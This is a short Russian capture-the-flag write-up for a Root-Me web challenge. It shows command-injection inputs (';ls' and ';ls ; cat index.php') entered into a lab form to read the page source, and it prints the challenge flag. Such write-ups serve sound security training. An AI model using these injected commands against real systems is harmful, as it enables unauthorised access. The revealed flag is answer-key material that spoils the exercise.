Решение таска с root-me
![](https://user-images.githubusercontent.com/65190309/135675952-86c0ba15-8499-4b37-9955-653c07177a51.jpg)
 В задании говорится, что есть некая уязвимость и флаг находится в файле index.php. Начнем
![](https://user-images.githubusercontent.com/65190309/135676016-b54284be-8295-48f5-bc0b-c147dfb8f615.jpg)
Переходим в директорию /index.php
http://challenge01.root-me.org/web-serveur/ch54/index.php
Далее вводим php-инъекцию ;ls 
![1](https://user-images.githubusercontent.com/65190309/135676497-f566cfb3-db99-46e9-b288-7dfe2b056c1b.png)
Ничего интересного не выдал, попросим у него вывести index.php
;ls ; cat index.php
![image](https://user-images.githubusercontent.com/65190309/135676609-88b3f80c-2d9b-4b32-bd27-5eec705a6088.png)
 Открыв исходный код видим заветный флаг 
Flag{S3rv1ceP1n9Sup3rS3cure}
![](https://user-images.githubusercontent.com/65190309/135676376-5d60123e-0077-48b7-82d3-f82d1421244f.jpg)


